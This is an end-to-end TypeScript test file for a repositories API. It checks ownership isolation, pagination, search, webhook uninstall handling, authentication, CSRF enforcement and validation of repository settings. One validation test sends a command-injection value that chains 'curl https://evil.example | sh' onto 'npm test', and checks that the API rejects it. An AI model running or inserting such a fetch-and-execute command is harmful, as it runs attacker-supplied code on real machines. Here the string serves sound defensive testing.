import type { Server } from 'node:http';

import {
  BranchListSchema,
  CSRF_HEADER,
  CSRF_HEADER_VALUE,
  ProblemDetailsSchema,
  type Repository,
  RepositoryPageSchema,
  RepositorySchema,
} from '@forgeops/contracts';
import type { INestApplication } from '@nestjs/common';
import request from 'supertest';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { signWebhookBody } from '../src/modules/github/application/webhook-signature.js';
import { FAKE_WEBHOOK_SECRET } from './fakes/fake-github-app.client.js';
import { createTestApp } from './utils/create-test-app.js';
import { type Agent, connectInstallation, signUp } from './utils/test-users.js';

describe('Repositories (e2e)', () => {
  let app: INestApplication<Server>;
  let alice: Agent;
  let bob: Agent;

  beforeEach(async () => {
    app = await createTestApp();
    alice = await signUp(app, 'alice@example.com');
    bob = await signUp(app, 'bob@example.com');
    await connectInstallation(app, alice, {
      installationId: 1,
      login: 'alice',
      githubUserId: 101,
      repoIds: [11, 12, 13],
    });
    await connectInstallation(app, bob, {
      installationId: 2,
      login: 'bob',
      githubUserId: 202,
      repoIds: [21],
    });
  });

  afterEach(async () => {
    await app.close();
  });

  async function firstRepository(agent: Agent): Promise<Repository> {
    const body: unknown = (await agent.get('/api/v1/repositories').expect(200)).body;
    const [repository] = RepositoryPageSchema.parse(body).items;
    if (!repository) throw new Error('expected at least one repository');
    return repository;
  }

  it('lists only your own repositories, with default settings', async () => {
    const body: unknown = (await alice.get('/api/v1/repositories').expect(200)).body;
    const page = RepositoryPageSchema.parse(body);

    expect(page.items.map((r) => r.githubRepoId).sort()).toEqual([11, 12, 13]);
    expect(page.items[0]?.settings.testCommand).toEqual(['npm', 'test']);
    expect(page.nextCursor).toBeNull();
  });

  it('paginates with a cursor', async () => {
    const first = RepositoryPageSchema.parse(
      (await alice.get('/api/v1/repositories').query({ limit: 2 }).expect(200)).body,
    );
    const second = RepositoryPageSchema.parse(
      (
        await alice
          .get('/api/v1/repositories')
          .query({ limit: 2, cursor: first.nextCursor })
          .expect(200)
      ).body,
    );

    expect(first.items).toHaveLength(2);
    expect(second.items).toHaveLength(1);
    expect(second.nextCursor).toBeNull();
    const ids = [...first.items, ...second.items].map((r) => r.id);
    expect(new Set(ids).size).toBe(3);
  });

  it('filters by search term', async () => {
    const body: unknown = (await alice.get('/api/v1/repositories').query({ search: 'REPO-12' }))
      .body;

    expect(RepositoryPageSchema.parse(body).items.map((r) => r.name)).toEqual(['repo-12']);
  });

  describe('ownership (IDOR)', () => {
    it("answers 404, not 403, for another user's repository", async () => {
      const bobsRepo = await firstRepository(bob);

      const response = await alice.get(`/api/v1/repositories/${bobsRepo.id}`).expect(404);
      expect(ProblemDetailsSchema.parse(response.body).code).toBe('not_found');
      await alice.get(`/api/v1/repositories/${bobsRepo.id}/branches`).expect(404);
    });

    it("cannot change another user's settings", async () => {
      const bobsRepo = await firstRepository(bob);

      await alice
        .patch(`/api/v1/repositories/${bobsRepo.id}/settings`)
        .send({ testCommand: ['npm', 'run', 'pwn'] })
        .expect(404);

      const unchanged = RepositorySchema.parse(
        (await bob.get(`/api/v1/repositories/${bobsRepo.id}`).expect(200)).body,
      );
      expect(unchanged.settings.testCommand).toEqual(['npm', 'test']);
    });

    it('hides repositories after the app is uninstalled', async () => {
      const repository = await firstRepository(alice);
      const body = JSON.stringify({ action: 'deleted', installation: { id: 1 } });
      await request(app.getHttpServer())
        .post('/api/v1/webhooks/github')
        .set('content-type', 'application/json')
        .set('x-github-event', 'installation')
        .set('x-github-delivery', 'uninstall-1')
        .set('x-hub-signature-256', signWebhookBody(FAKE_WEBHOOK_SECRET, body))
        .send(body)
        .expect(202);

      const page: unknown = (await alice.get('/api/v1/repositories').expect(200)).body;
      expect(RepositoryPageSchema.parse(page).items).toEqual([]);
      await alice.get(`/api/v1/repositories/${repository.id}`).expect(404);
    });

    it('requires authentication', async () => {
      const response = await request(app.getHttpServer()).get('/api/v1/repositories').expect(401);
      expect(ProblemDetailsSchema.parse(response.body).code).toBe('unauthenticated');
    });
  });

  it('rejects a malformed id with 400', async () => {
    await alice.get('/api/v1/repositories/not-a-uuid').expect(400);
  });

  it('lists branches live from GitHub', async () => {
    const repository = await firstRepository(alice);

    const body: unknown = (
      await alice.get(`/api/v1/repositories/${repository.id}/branches`).expect(200)
    ).body;
    expect(BranchListSchema.parse(body).items[0]?.name).toBe('main');
  });

  describe('settings', () => {
    it('merges a partial update and keeps the other values', async () => {
      const repository = await firstRepository(alice);

      const body: unknown = (
        await alice
          .patch(`/api/v1/repositories/${repository.id}/settings`)
          .send({ testCommand: ['pnpm', 'test'], limits: { maxDiffLines: 800 } })
          .expect(200)
      ).body;

      const { settings } = RepositorySchema.parse(body);
      expect(settings.testCommand).toEqual(['pnpm', 'test']);
      expect(settings.limits).toEqual({
        maxFilesChanged: 10,
        maxDiffLines: 800,
        testTimeoutSeconds: 300,
      });
      expect(settings.installCommand).toEqual(['npm', 'ci']);
    });

    it('rejects a shell-string test command', async () => {
      const repository = await firstRepository(alice);

      const response = await alice
        .patch(`/api/v1/repositories/${repository.id}/settings`)
        .send({ testCommand: 'npm test && curl https://evil.example | sh' })
        .expect(400);
      expect(ProblemDetailsSchema.parse(response.body).code).toBe('validation_failed');
    });

    it('requires the CSRF header', async () => {
      const repository = await firstRepository(alice);
      // A browser session for alice that does NOT add the CSRF header by default.
      const session = request.agent(app.getHttpServer());
      await session
        .post('/api/v1/auth/login')
        .set(CSRF_HEADER, CSRF_HEADER_VALUE)
        .send({ email: 'alice@example.com', password: 'correct horse battery staple' })
        .expect(200);

      await session
        .patch(`/api/v1/repositories/${repository.id}/settings`)
        .send({ testCommand: ['pnpm', 'test'] })
        .expect(403);
    });
  });
});
